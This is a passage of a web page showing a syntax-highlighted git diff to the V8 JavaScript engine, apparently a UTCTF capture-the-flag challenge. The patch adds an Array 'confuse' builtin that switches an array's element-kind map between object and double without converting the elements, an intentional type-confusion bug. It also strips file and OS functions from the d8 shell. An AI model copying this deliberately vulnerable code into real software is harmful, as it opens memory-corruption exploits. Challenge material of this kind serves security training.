style="color:#B31D28">;</span><br><span style="color:#B31D28">-  // Some Emscripten-generated code tries to call 'quit', which in turn would</span><br><span style="color:#B31D28">-  // call C's exit</span><span style="color:#bda437">(</span><span style="color:#bda437">)</span><span style="color:#B31D28">. This would lead to memory leaks, because there is no way</span><br><span style="color:#B31D28">-  // we can terminate cleanly then, so we need a way to hide 'quit'.</span><br><span style="color:#B31D28">-  if </span><span style="color:#bda437">(</span><span style="color:#B31D28">!options.omit_quit</span><span style="color:#bda437">)</span><span style="color:#B31D28"> </span><span style="color:#bda437">{</span><br><span style="color:#B31D28">-    global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, "quit", FunctionTemplate::New</span><span style="color:#2993a3">(</span><span style="color:#B31D28">isolate, Quit</span><span style="color:#2993a3">)</span><span style="color:#296aa3">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  </span><span style="color:#bda437">}</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "testRunner",</span><br><span style="color:#B31D28">-                       Shell::CreateTestRunnerTemplate</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "Realm", Shell::CreateRealmTemplate</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "performance",</span><br><span style="color:#B31D28">-                       Shell::CreatePerformanceTemplate</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "Worker", Shell::CreateWorkerTemplate</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-</span><br><span style="color:#B31D28">-  // Prevent fuzzers from creating side effects.</span><br><span style="color:#B31D28">-  if </span><span style="color:#bda437">(</span><span style="color:#B31D28">!i::v8_flags.fuzzing</span><span style="color:#bda437">)</span><span style="color:#B31D28"> </span><span style="color:#bda437">{</span><br><span style="color:#B31D28">-    global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, "os", Shell::CreateOSTemplate</span><span style="color:#2993a3">(</span><span style="color:#B31D28">isolate</span><span style="color:#2993a3">)</span><span style="color:#296aa3">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  </span><span style="color:#bda437">}</span><br><span style="color:#B31D28">-  global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#bda437">(</span><span style="color:#B31D28">isolate, "d8", Shell::CreateD8Template</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-</span><br><span style="color:#B31D28">-  if </span><span style="color:#bda437">(</span><span style="color:#B31D28">i::v8_flags.expose_async_hooks</span><span style="color:#bda437">)</span><span style="color:#B31D28"> </span><span style="color:#bda437">{</span><br><span style="color:#B31D28">-    global_template-</span><span style="color:#B31D28">></span><span style="color:#B31D28">Set</span><span style="color:#296aa3">(</span><span style="color:#B31D28">isolate, "async_hooks",</span><br><span style="color:#B31D28">-                         Shell::CreateAsyncHookTemplate</span><span style="color:#2993a3">(</span><span style="color:#B31D28">isolate</span><span style="color:#2993a3">)</span><span style="color:#296aa3">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-  </span><span style="color:#bda437">}</span><br><br><span style="color:#393A34">   return global_template;</span><br><span style="color:#393A34"> </span><span style="color:#a13865">}</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -3719,10 +3676,12 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> void Shell::Initialize</span><span style="color:#a13865">(</span><span style="color:#393A34">Isolate* isolate, D8Console* console,</span><br><span style="color:#393A34">             v8::Isolate::kMessageLog</span><span style="color:#a13865">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">   </span><span style="color:#1e754f">}</span><br><br><span style="color:#22863A">+	/*</span><br><span style="color:#393A34">   isolate-</span><span style="color:#393A34">></span><span style="color:#393A34">SetHostImportModuleDynamicallyCallback</span><span style="color:#1e754f">(</span><br><span style="color:#393A34">       Shell::HostImportModuleDynamically</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">   isolate-</span><span style="color:#393A34">></span><span style="color:#393A34">SetHostInitializeImportMetaObjectCallback</span><span style="color:#1e754f">(</span><br><span style="color:#393A34">       Shell::HostInitializeImportMetaObject</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#22863A">+	*/</span><br><span style="color:#393A34">   isolate-</span><span style="color:#393A34">></span><span style="color:#393A34">SetHostCreateShadowRealmContextCallback</span><span style="color:#1e754f">(</span><br><span style="color:#393A34">       Shell::HostCreateShadowRealmContext</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><br><span style="color:#005CC5">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span style="color:#393A34">index 48249695b7b..ceb2b23e916 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/init/bootstrapper.cc</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/init/bootstrapper.cc</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -2571,6 +2571,9 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> void Genesis::InitializeGlobal</span><span style="color:#1e754f">(</span><span style="color:#393A34">Handle</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">JSGlobalObject</span><span style="color:#393A34">></span><span style="color:#393A34"> global_object,</span><br><span style="color:#393A34">                           false</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#393A34">     SimpleInstallFunction</span><span style="color:#1e754f">(</span><span style="color:#393A34">isolate_, proto, "join", Builtin::kArrayPrototypeJoin,</span><br><span style="color:#393A34">                           1, false</span><span style="color:#1e754f">)</span><span style="color:#393A34">;</span><br><span style="color:#22863A">+    // Custom Additions </span><span style="color:#1e754f">(</span><span style="color:#22863A">UTCTF</span><span style="color:#1e754f">)</span><br><span style="color:#22863A">+    SimpleInstallFunction</span><span style="color:#1e754f">(</span><span style="color:#22863A">isolate_, proto, "confuse", Builtin::kArrayConfuse,</span><br><span style="color:#22863A">+                          0, false</span><span style="color:#1e754f">)</span><span style="color:#22863A">;</span><br><br><span style="color:#393A34">     </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><span style="color:#393A34">  // Set up iterator-related properties.</span><br><span style="color:#393A34">       DirectHandle</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">JSFunction</span><span style="color:#393A34">></span><span style="color:#393A34"> keys = InstallFunctionWithBuiltinId</span><span style="color:rgba(255, 18, 18, 0.8)">(</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-diff language-diff"><span style="color:#79B8FF">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span style="color:#DBD7CAEE">index ea45a7ada6b..3af3bea5725 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/builtins/builtins-array.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/builtins/builtins-array.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -1589,5 +1589,44 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> BUILTIN</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ArrayConcat</span><span style="color:#5eaab5">)</span><span style="color:#DBD7CAEE"> </span><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">   return Slow_ArrayConcat</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">&#x26;args, species, isolate</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE"> </span><span style="color:#5eaab5">}</span><br><br><span style="color:#85E89D">+// Custom Additions </span><span style="color:#5eaab5">(</span><span style="color:#85E89D">UTCTF</span><span style="color:#5eaab5">)</span><br><span style="color:#85E89D">+</span><br><span style="color:#85E89D">+BUILTIN</span><span style="color:#5eaab5">(</span><span style="color:#85E89D">ArrayConfuse</span><span style="color:#5eaab5">)</span><span style="color:#85E89D"> </span><span style="color:#5eaab5">{</span><br><span style="color:#85E89D">+  HandleScope scope</span><span style="color:#4d9375">(</span><span style="color:#85E89D">isolate</span><span style="color:#4d9375">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+  Factory *factory = isolate-</span><span style="color:#85E89D">></span><span style="color:#85E89D">factory</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+  Handle</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">Object</span><span style="color:#85E89D">></span><span style="color:#85E89D"> receiver = args.receiver</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+</span><br><span style="color:#85E89D">+  if </span><span style="color:#4d9375">(</span><span style="color:#85E89D">!IsJSArray</span><span style="color:#d4976c">(</span><span style="color:#85E89D">*receiver</span><span style="color:#d4976c">)</span><span style="color:#85E89D"> || !HasOnlySimpleReceiverElements</span><span style="color:#d4976c">(</span><span style="color:#85E89D">isolate, Cast</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">JSArray</span><span style="color:#85E89D">></span><span style="color:#d9739f">(</span><span style="color:#85E89D">*receiver</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#85E89D"> </span><span style="color:#4d9375">{</span><br><span style="color:#85E89D">+    THROW_NEW_ERROR_RETURN_FAILURE</span><span style="color:#d4976c">(</span><span style="color:#85E89D">isolate, NewTypeError</span><span style="color:#d9739f">(</span><span style="color:#85E89D">MessageTemplate::kPlaceholderOnly,</span><br><span style="color:#85E89D">+      factory-</span><span style="color:#85E89D">></span><span style="color:#85E89D">NewStringFromAsciiChecked</span><span style="color:#e6cc77">(</span><span style="color:#85E89D">"Invalid type. Must be a JSArray."</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+  </span><span style="color:#4d9375">}</span><br><span style="color:#85E89D">+</span><br><span style="color:#85E89D">+  Handle</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">JSArray</span><span style="color:#85E89D">></span><span style="color:#85E89D"> array = Cast</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">JSArray</span><span style="color:#85E89D">></span><span style="color:#4d9375">(</span><span style="color:#85E89D">receiver</span><span style="color:#4d9375">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+  ElementsKind kind = array-</span><span style="color:#85E89D">></span><span style="color:#85E89D">GetElementsKind</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+</span><br><span style="color:#85E89D">+  if </span><span style="color:#4d9375">(</span><span style="color:#85E89D">kind == PACKED_ELEMENTS</span><span style="color:#4d9375">)</span><span style="color:#85E89D"> </span><span style="color:#4d9375">{</span><br><span style="color:#85E89D">+    DirectHandle</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">Map</span><span style="color:#85E89D">></span><span style="color:#85E89D"> map = JSObject::GetElementsTransitionMap</span><span style="color:#d4976c">(</span><br><span style="color:#85E89D">+        array, PACKED_DOUBLE_ELEMENTS</span><span style="color:#d4976c">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+    </span><span style="color:#d4976c">{</span><br><span style="color:#85E89D">+      DisallowGarbageCollection no_gc;</span><br><span style="color:#85E89D">+      Tagged</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">JSArray</span><span style="color:#85E89D">></span><span style="color:#85E89D"> raw = *array;</span><br><span style="color:#85E89D">+      raw-</span><span style="color:#85E89D">></span><span style="color:#85E89D">set_map</span><span style="color:#d9739f">(</span><span style="color:#85E89D">*map, kReleaseStore</span><span style="color:#d9739f">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+    </span><span style="color:#d4976c">}</span><br><span style="color:#85E89D">+  </span><span style="color:#4d9375">}</span><span style="color:#85E89D"> else if </span><span style="color:#4d9375">(</span><span style="color:#85E89D">kind == PACKED_DOUBLE_ELEMENTS</span><span style="color:#4d9375">)</span><span style="color:#85E89D"> </span><span style="color:#4d9375">{</span><br><span style="color:#85E89D">+    DirectHandle</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">Map</span><span style="color:#85E89D">></span><span style="color:#85E89D"> map = JSObject::GetElementsTransitionMap</span><span style="color:#d4976c">(</span><br><span style="color:#85E89D">+        array, PACKED_ELEMENTS</span><span style="color:#d4976c">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+    </span><span style="color:#d4976c">{</span><br><span style="color:#85E89D">+      DisallowGarbageCollection no_gc;</span><br><span style="color:#85E89D">+      Tagged</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">JSArray</span><span style="color:#85E89D">></span><span style="color:#85E89D"> raw = *array;</span><br><span style="color:#85E89D">+      raw-</span><span style="color:#85E89D">></span><span style="color:#85E89D">set_map</span><span style="color:#d9739f">(</span><span style="color:#85E89D">*map, kReleaseStore</span><span style="color:#d9739f">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+    </span><span style="color:#d4976c">}</span><br><span style="color:#85E89D">+  </span><span style="color:#4d9375">}</span><span style="color:#85E89D"> else </span><span style="color:#4d9375">{</span><br><span style="color:#85E89D">+    THROW_NEW_ERROR_RETURN_FAILURE</span><span style="color:#d4976c">(</span><span style="color:#85E89D">isolate, NewTypeError</span><span style="color:#d9739f">(</span><span style="color:#85E89D">MessageTemplate::kPlaceholderOnly,</span><br><span style="color:#85E89D">+      factory-</span><span style="color:#85E89D">></span><span style="color:#85E89D">NewStringFromAsciiChecked</span><span style="color:#e6cc77">(</span><span style="color:#85E89D">"Invalid JSArray type. Must be an object or float array."</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+  </span><span style="color:#4d9375">}</span><br><span style="color:#85E89D">+</span><br><span style="color:#85E89D">+  return ReadOnlyRoots</span><span style="color:#4d9375">(</span><span style="color:#85E89D">isolate</span><span style="color:#4d9375">)</span><span style="color:#85E89D">.undefined_value</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+</span><span style="color:#5eaab5">}</span><br><span style="color:#85E89D">+</span><br><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">}</span><span style="color:#DBD7CAEE">  // namespace internal</span><br><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">}</span><span style="color:#DBD7CAEE">  // namespace v8</span><br><span style="color:#79B8FF">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span style="color:#DBD7CAEE">index 78cbf8874ed..872db196d15 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/builtins/builtins-definitions.h</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/builtins/builtins-definitions.h</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -426,6 +426,8 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> namespace internal </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#DBD7CAEE">   CPP</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">ArrayShift</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">                                                              \</span><br><span style="color:#DBD7CAEE">   /* ES6 #sec-array.prototype.unshift */                                       \</span><br><span style="color:#DBD7CAEE">   CPP</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">ArrayUnshift</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">                                                            \</span><br><span style="color:#85E89D">+  /* Custom Additions </span><span style="color:#4d9375">(</span><span style="color:#85E89D">UTCTF</span><span style="color:#4d9375">)</span><span style="color:#85E89D"> */                                               \</span><br><span style="color:#85E89D">+  CPP</span><span style="color:#4d9375">(</span><span style="color:#85E89D">ArrayConfuse</span><span style="color:#4d9375">)</span><span style="color:#85E89D">                                                            \</span><br><span style="color:#DBD7CAEE">   /* Support for Array.from and other array-copying idioms */                  \</span><br><span style="color:#DBD7CAEE">   TFS</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">CloneFastJSArray, NeedsContext::kYes, kSource</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">                           \</span><br><span style="color:#DBD7CAEE">   TFS</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">CloneFastJSArrayFillingHoles, NeedsContext::kYes, kSource</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE">               \</span><br><span style="color:#79B8FF">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span style="color:#DBD7CAEE">index 9a346d134b9..99a2bc95944 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/compiler/typer.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/compiler/typer.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -1937,6 +1937,9 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> Type Typer::Visitor::JSCallTyper</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">Type fun, Typer* t</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> </span><span style="color:#4d9375">{</span><br><span style="color:#DBD7CAEE">       return Type::Receiver</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#DBD7CAEE">     case Builtin::kArrayUnshift:</span><br><span style="color:#DBD7CAEE">       return t-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">cache_-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">kPositiveSafeInteger;</span><br><span style="color:#85E89D">+    // Custom Additions </span><span style="color:#d4976c">(</span><span style="color:#85E89D">UTCTF</span><span style="color:#d4976c">)</span><br><span style="color:#85E89D">+    case Builtin::kArrayConfuse:</span><br><span style="color:#85E89D">+      return Type::Undefined</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#85E89D">;</span><br><br><span style="color:#DBD7CAEE">     // ArrayBuffer functions.</span><br><span style="color:#DBD7CAEE">     case Builtin::kArrayBufferIsView:</span><br><span style="color:#79B8FF">diff --git a/src/d8/d8.cc b/src/d8/d8.cc</span><br><span style="color:#DBD7CAEE">index facf0d86d79..95340facaad 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/d8/d8.cc</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/d8/d8.cc</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -3364,53 +3364,10 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> Local</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">FunctionTemplate</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> Shell::CreateNodeTemplates</span><span style="color:rgba(255, 18, 18, 0.8)">(</span><br><br><span style="color:#DBD7CAEE"> Local</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">ObjectTemplate</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> Shell::CreateGlobalTemplate</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">Isolate* isolate</span><span style="color:#d9739f">)</span><span style="color:#DBD7CAEE"> </span><span style="color:#d9739f">{</span><br><span style="color:#DBD7CAEE">   Local</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">ObjectTemplate</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> global_template = ObjectTemplate::New</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">isolate</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">Symbol::GetToStringTag</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">,</span><br><span style="color:#FDAEB7">-                       String::NewFromUtf8Literal</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, "global"</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#DBD7CAEE">   global_template-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">Set</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">isolate, "version",</span><br><span style="color:#DBD7CAEE">                        FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#DBD7CAEE">isolate, Version</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">;</span><br><br><span style="color:#DBD7CAEE">   global_template-</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE">Set</span><span style="color:#e6cc77">(</span><span style="color:#DBD7CAEE">isolate, "print", FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#DBD7CAEE">isolate, Print</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "printErr",</span><br><span style="color:#FDAEB7">-                       FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, PrintErr</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "write",</span><br><span style="color:#FDAEB7">-                       FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, WriteStdout</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  if </span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">!i::v8_flags.fuzzing</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7"> </span><span style="color:#e6cc77">{</span><br><span style="color:#FDAEB7">-    global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, "writeFile",</span><br><span style="color:#FDAEB7">-                         FunctionTemplate::New</span><span style="color:#5eaab5">(</span><span style="color:#FDAEB7">isolate, WriteFile</span><span style="color:#5eaab5">)</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  </span><span style="color:#e6cc77">}</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "read",</span><br><span style="color:#FDAEB7">-                       FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, ReadFile</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "readbuffer",</span><br><span style="color:#FDAEB7">-                       FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, ReadBuffer</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "readline",</span><br><span style="color:#FDAEB7">-                       FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, ReadLine</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "load",</span><br><span style="color:#FDAEB7">-                       FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, ExecuteFile</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "setTimeout",</span><br><span style="color:#FDAEB7">-                       FunctionTemplate::New</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, SetTimeout</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  // Some Emscripten-generated code tries to call 'quit', which in turn would</span><br><span style="color:#FDAEB7">-  // call C's exit</span><span style="color:#e6cc77">(</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">. This would lead to memory leaks, because there is no way</span><br><span style="color:#FDAEB7">-  // we can terminate cleanly then, so we need a way to hide 'quit'.</span><br><span style="color:#FDAEB7">-  if </span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">!options.omit_quit</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7"> </span><span style="color:#e6cc77">{</span><br><span style="color:#FDAEB7">-    global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, "quit", FunctionTemplate::New</span><span style="color:#5eaab5">(</span><span style="color:#FDAEB7">isolate, Quit</span><span style="color:#5eaab5">)</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  </span><span style="color:#e6cc77">}</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "testRunner",</span><br><span style="color:#FDAEB7">-                       Shell::CreateTestRunnerTemplate</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "Realm", Shell::CreateRealmTemplate</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "performance",</span><br><span style="color:#FDAEB7">-                       Shell::CreatePerformanceTemplate</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-  global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">isolate, "Worker", Shell::CreateWorkerTemplate</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-</span><br><span style="color:#FDAEB7">-  // Prevent fuzzers from creating side effects.</span><br><span style="color:#FDAEB7">-  if </span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">!i::v8_flags.fuzzing</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7"> </span><span style="color:#e6cc77">{</span><br><span style="color:#FDAEB7">-    global_template-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">Set</span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">isolate, "os", 